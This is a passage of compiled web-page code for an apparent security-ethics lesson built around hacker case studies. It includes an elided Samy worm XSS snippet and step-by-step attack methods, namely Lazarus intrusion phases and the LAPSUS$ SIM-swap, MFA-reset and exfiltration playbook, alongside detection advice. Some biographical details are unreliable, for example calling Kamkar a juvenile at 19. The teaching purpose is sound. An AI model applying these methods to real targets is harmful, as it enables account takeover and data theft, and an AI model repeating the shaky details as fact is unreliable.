        children: "Positive:\n├── Stopped the world's largest ransomware attack\n├── NHS likely saved from catastrophic impact\n├── $4B+ in prevented damages\n├── Received widespread recognition from security community\n└── International acclaim for selfless action\n\nControversial:\n├── Some critics argued sinkholing could be considered unauthorized access\n├── Legal questions about intercepting and redirecting malware traffic\n└── WHITE HAT ETHICS: Clearly a positive action, legally gray in some jurisdictions\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Irony: Marcus's Arrest:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "August 2, 2017: Marcus arrested by FBI in Las Vegas (DefCon bound)\nCharges: Creating and distributing Kronos banking trojan (2014-2015)\n├── Helpful security researcher also had a past\n├── Charged: One count of computer fraud, one count of conspiracy\n├── Pleaded guilty to two charges\n└── Sentenced: Time served + 3 years supervised release\n\nThe Lesson:\n├── People can change and contribute positively\n├── Past actions don't define future contributions\n└── The line between Black Hat and White Hat can be blurry\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "case-study-3-khalil-shreateh--facebook-bug-bounty-dispute",
      children: "Case Study 3: Khalil Shreateh — Facebook Bug Bounty Dispute"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), "\nIn 2013, Palestinian security researcher Khalil Shreateh discovered a critical vulnerability in Facebook that allowed posting to any user's wall without permission. His attempt to report it led to one of the most famous bug bounty disputes in history."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Timeline:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "July 2013:\n├── Khalil finds: Facebook allows posting to any user's wall\n├── Reports to Facebook's WhiteHat program via standard form\n└── Facebook triage team marks as \"Not a bug\"\n\nWeek 2:\n├── Khalil escalates: more detailed report with reproduction steps\n├── Facebook triage: \"Cannot reproduce\"\n└── Khalil posts proof on his personal blog\n\nWeek 3:\n├── Facebook: \"Issue already exists internally, duplicate\"\n├── Khalil: Frustrated, decides to prove severity\n└── Posts directly to Mark Zuckerberg's wall from his personal account\n\nImmediate Aftermath:\n├── Facebook immediately fixed the bug\n├── Disabled Khalil's account (for \"unauthorized testing on real users\")\n├── Facebook initially refused to pay bounty\n└── After public backlash, offered $500 (Khalil rejected)\n\nCommunity Response:\n├── Bug bounty community was outraged\n├── #StandWithKhalil campaign raised $10K+ via crowdfunding\n├── Many argued Facebook's handling was unjust\n└── Khalil became a symbol of Gray Hat ethics\n\nEnding:\n├── HackerOne hired Khalil as a security engineer\n├── Facebook updated their bug bounty policies\n├── Bug bounty programs became more transparent about dispute resolution\n└── Khalil's case is now taught in security ethics courses\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Ethical Analysis:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Factor"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Pro-Khalil"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Anti-Khalil"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Intention"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Good: Wanted to fix a serious bug"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Testing on a real user without consent"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Method"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Necessary escalation after dismissal"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Violated terms of service"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bug fixed, Facebook more secure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Violated Facebook's authorization"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Precedent"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shows researchers need escalation path"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Could encourage unauthorized testing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Outcome"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hired, educated industry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Account banned, no bounty"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lesson for Pentesters:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Always follow the platform's disclosure process"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document every attempt to contact vendor"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Never test on real users without explicit permission"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Understand the legal risks of \"proving\" a vulnerability"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Bug bounty programs have improved dispute resolution significantly since 2013"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "case-study-4-lazarus-group--north-koreas-cyber-army",
      children: "Case Study 4: Lazarus Group — North Korea's Cyber Army"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), "\nLazarus Group (also known as HIDDEN COBRA) is a North Korean state-sponsored APT group responsible for some of the most destructive cyber attacks in history. They operate under the Reconnaissance General Bureau (RGB), North Korea's primary foreign intelligence agency."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Major Attacks:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Sony Pictures Hack (2014)\n├── Target: Sony Pictures Entertainment\n├── Reason: Response to \"The Interview\" comedy about assassinating Kim Jong-un\n├── Method: Spear-phishing → lateral movement → data destruction\n├── Data: 100TB stolen, 3,200 PCs destroyed, 2,080 servers wiped\n├── Impact: $100M+ in damages, studio operations shut down for weeks\n└── Attribution: FBI attributed to North Korea, NSA confirmed\n\nBangladesh Bank Heist (2016)\n├── Target: Bangladesh Bank (central bank) — SWIFT system\n├── Method: Compromised SWIFT credentials via keylogger + screen capture\n├── Attempted Theft: $951 million\n├── Successful: $81 million (rest was blocked by typo in transfer instructions)\n├── Money Flow: Bangladesh → Sri Lanka → Philippines → Casinos → North Korea\n└── Attribution: UN Security Council confirmed North Korean involvement\n\nWannaCry Ransomware (2017)\n├── Target: Global (230K computers in 150 countries)\n├── Method: Exploited EternalBlue (NSA exploit) for worm-like propagation\n├── Impact: $4B+ in damages\n└── Attribution: US, UK, Australia officially attributed to North Korea\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lazarus Tool Arsenal:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Custom Malware:\n├── Sora — RAT with video recording capabilities (for SWIFT observation)\n├── Destover — Disk-wiping malware (used against Sony)\n├── Brambul — SMB worm for lateral movement\n├── Joanap — Peer-to-peer botnet\n├── Manuscrypt — keylogger and screen capture\n└── ThreatNeedle — backdoor with encrypted C2\n\nExploits Used:\n├── EternalBlue (NSA) — SMB RCE\n├── DoublePulsar (NSA) — SMB backdoor\n├── CVE-2021-42278/CVE-2021-42287 — AD privilege escalation\n└── CVE-2019-0708 (BlueKeep) — RDP RCE\n\nC2 Infrastructure:\n├── Distributed across 50+ countries\n├── Uses legitimate compromised servers as proxies\n├── Domain generation algorithms (DGA) for resilience\n├── Multiple staging layers (typically 3-4 hops)\n└── Cryptocurrency mining as side operation\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "TTP Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Phase 1: Reconnaissance\n├── Targeted employees via LinkedIn, job boards\n├── Spear-phishing with malicious HWP (Hangul Word Processor) files\n└── Watering hole attacks on crypto exchange platforms\n\nPhase 2: Initial Access\n├── HWP document with embedded exploit\n├── Macro downloads and executes trojan\n└── Establishes persistent C2 over HTTPS\n\nPhase 3: Credential Access\n├── Keyloggers record banking credentials\n├── Screen captures of SWIFT transaction approval screens\n└── Mimikatz to extract Windows domain credentials\n\nPhase 4: SWIFT Exploitation\n├── Installed custom SWIFT monitoring tools\n├── Mapped SWIFT Alliance Access workflow\n├── Modified transaction amounts and recipients\n└── Deleted transaction records after fraudulent transfers\n\nPhase 5: Cryptocurrency Laundering\n├── Stolen funds → multiple intermediaries\n├── Philippines: casino junket operators (money laundering)\n├── Converted to cryptocurrency\n└── Bitcoin through mixers → North Korea\n\nPhase 6: Denial and Cover-up\n├── Destover wiper: destroyed evidence on compromised systems\n├── Suppressed security alerts\n└── Ransomware as false flag (WannaCry appeared criminal, not state)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Monitor for HWP file execution in non-Korean environments"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Watch for anomalous SWIFT transaction patterns"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Deploy network monitoring for Lazarus-specific C2 signatures"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enable and monitor Windows Event IDs 4624, 4648, 4672 (logon events)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Monitor DNS for known Lazarus DGA domains"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Current Status:"
      }), "\nStill active. Continues to target cryptocurrency exchanges, DeFi platforms, and blockchain companies. Estimated to have stolen over ", (0,jsx_runtime.jsxs)(_components.span, {
        className: "katex",
        children: [(0,jsx_runtime.jsx)(_components.span, {
          className: "katex-mathml",
          children: (0,jsx_runtime.jsx)(_components.math, {
            xmlns: "http://www.w3.org/1998/Math/MathML",
            children: (0,jsx_runtime.jsxs)(_components.semantics, {
              children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                children: [(0,jsx_runtime.jsx)(_components.mn, {
                  children: "3"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "B"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "2020"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "g"
                })]
              }), (0,jsx_runtime.jsx)(_components.annotation, {
                encoding: "application/x-tex",
                children: "3B in cryptocurrency since 2020, including "
              })]
            })
          })
        }), (0,jsx_runtime.jsx)(_components.span, {
          className: "katex-html",
          "aria-hidden": "true",
          children: (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "0.8889em",
                verticalAlign: "-0.1944em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "3"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0502em"
              },
              children: "B"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "cr"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "pt"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "oc"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "cy"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ce"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "2020"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "c"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "g"
            })]
          })
        })]
      }), "1.7B in 2022 alone."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "case-study-5-samy-kamkar--myspace-worm-to-security-researcher",
      children: "Case Study 5: Samy Kamkar — MySpace Worm to Security Researcher"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), "\nSamy Kamkar created the \"Samy worm\" in 2005 — the first self-propagating cross-site scripting (XSS) worm. It infected over 1 million MySpace profiles in just 20 hours. He is now a respected security researcher."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The Samy Worm (2005):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "// Simplified version of the Samy worm payload\n// The worm used four vectors:\n// 1. XSS in MySpace profile page\n// 2. AJAX requests to propagate\n// 3. CSS to hide itself\n// 4. Self-propagation to infect viewers\n\n// The XSS payload placed in the \"About Me\" section:\n<div id=mycode style=\"display:none\">\n<script>\n// Check if viewer is already infected\nif (document.getElementById(\"mycode\") === null) {\n    // Payload: Add Samy as friend, then copy to viewer's profile\n    var ajax = new XMLHttpRequest();\n    var url = \"/index.cfm?fuseaction=...\";\n    ajax.open(\"POST\", url, true);\n    ajax.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    ajax.send(\"interest=...\");\n    \n    // Copy worm code to viewer's profile (propagation)\n    // This made the viewer's profile infectious\n}\n</script>\n</div>\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Impact:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "More than 1 million profiles infected in 20 hours\nMySpace forced to shut down for maintenance\nFBI investigated Samy Kamkar\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Legal Outcome:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Charged as a juvenile (he was 19)\n├── Pleaded guilty to felony computer fraud\n├── Sentenced: 3 years probation\n├── Restitution: Not ordered\n└── Community service: 90 days\n\nWHITE HAT TRANSITION:\n├── Became a leading security researcher\n├── Created: DNS rebinding tool, RFID cloning suite, multiple security tools\n├── Works with major companies on vulnerability disclosure\n├── Speakers at Black Hat, DefCon\n└── Consulted for DHS, major tech companies\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "What He Says About It:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "\"I didn't think about the consequences. I was just a kid who thought it would be cool to have a million friends on MySpace. Looking back, it was a stupid thing to do, but it also showed me the power of understanding how technology works — and how it can be used against people.\""
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "case-study-6-lapsus--teen-cybercrime-syndicate",
      children: "Case Study 6: LAPSUS$ — Teen Cybercrime Syndicate"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), "\nLAPSUS$ was a loosely organized group of primarily teenage hackers (ages 16-21) who conducted a series of high-profile attacks in 2021-2022 using social engineering as their primary weapon."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Victims Timeline:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "December 2021: Brazilian Ministry of Health (leaked COVID data)\nFebruary 2022: Nvidia (1TB stolen, including source code)\nMarch 2022: Samsung (190GB source code leaked)\nMarch 2022: Okta (customer support system breached)\nMarch 2022: Microsoft (37GB source code, Azure DevOps stolen)\nMarch 2022: Ubisoft (internal systems compromised)\nMarch 2022: Rockstar Games (GTA VI source code and videos)\nMarch 2022: Globant (multiple client data)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Methodology:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "LAPSUS$ didn't use sophisticated malware — their approach was almost pure social engineering:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Step 1: Reconnaissance\n├── Target employees identified via LinkedIn, Telegram, Discord\n├── Personal information gathered (hobbies, job roles, locations)\n└── VPN provider accounts researched\n\nStep 2: Credential Harvesting\n├── SIM swapping: Social engineer telecom support to port phone number\n├── Phone → password reset on target's corporate accounts\n├── Alternative: Purchase credentials from info-stealer marketplaces\n└── Alternative: Breach employee's personal accounts for password reuse\n\nStep 3: MFA Bypass\n├── Call IT help desk: \"I lost my phone, need to reset MFA\"\n├── Provide enough PII (from recon) to pass verification\n├── Help desk resets MFA or provides backup codes\n└── Pure social engineering, zero technical exploitation\n\nStep 4: Initial Access\n├── Log in to VPN with employee credentials\n├── Register personal device with MDM/push MFA\n├── Access internal tools, GitLab, Jira, Slack\n└── Search for \"password\" in internal wikis/confluence\n\nStep 5: Privilege Escalation\n├── Find service account passwords in Confluence/source code\n├── Find OAuth tokens in source code repositories\n├── Search for AWS/Azure service principals\n└── Use admin tools accessible to basic employees\n\nStep 6: Data Exfiltration\n├── Download source code from GitLab/GitHub\n├── Access AWS S3/Azure Blob storage\n├── Use Rclone to transfer data to cloud storage\n└── Announce breach on Telegram before companies knew\n\nStep 7: Extortion (when applicable)\n├── \"We have your data. Pay us or we leak.\"\n├── Negotiate in Telegram DMs\n└── Leak when demands not met (almost always)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "OPSEC Failures:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "1. Bragging in Telegram chats\n   ├── \"We just got into Okta!\"\n   └── Conversations included real names and locations\n\n2. Using personal infrastructure\n   ├── Some VPN connections traced to home IPs\n   └── Used personal accounts for GitHub commits\n\n3. Coordinated via compromised company Slack\n   ├── Talked about other targets in breached Slack channels\n   └── Law enforcement monitoring those channels\n\n4. Same handles across platforms\n   ├── User \"breachbase\" used everywhere\n   └── Cross-platform identity linkage\n\n5. Monetary trail\n   ├── SIM swap payments linked to personal accounts\n   └── Cryptocurrency exchange deposits with KYC\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Aftermath:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "UK police arrested 7 people (ages 16-21) in 2022"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "City of London Police Cyber Crime Unit led the investigation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Multiple suspects charged with computer misuse and fraud"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Key suspect (17 years old) ordered to pay millions in restitution"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "The case highlighted the danger of social engineering over technical hacking"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Led to widespread changes in SIM swap and MFA reset procedures"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Security Lessons:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Human firewall is critical:"
        }), " Technical controls fail if help desk can be social engineered"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MFA reset procedures:"
        }), " Require in-person verification or manager approval"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Internal tool hygiene:"
        }), " Don't store passwords in Confluence, wikis, or source code"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "OAuth token security:"
        }), " Service principals should be scoped, monitored, and rotated"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Session monitoring:"
        }), " Alert on suspicious VPN access patterns (unusual geography, time)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Telecom security:"
        }), " Push for SIM swap protection protocols (like T-Mobile's No Port)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-6-comparison-tables",
      children: "Section 6: Comparison Tables"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "61-black-hat-vs-white-hat-vs-gray-hat-comparison",
      children: "6.1 Black Hat vs White Hat vs Gray Hat Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Dimension"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Black Hat"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "White Hat"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Gray Hat"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Authorization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Written ROE, explicit scope"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (or ambiguous)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Motivation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Financial, espionage, ideology"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security improvement, career"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recognition, fix bugs, sometimes $$"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Legal Status"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Criminal (CFAA, CMA)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Legal with contract"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Gray area (varies by jurisdiction)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Testing Methodology"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stealth, persistence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Structured (PTES, OSSTMM)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ad-hoc, focused on findings"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability Disclosure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sell on darknet, weaponize"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CVE, coordinated disclosure"
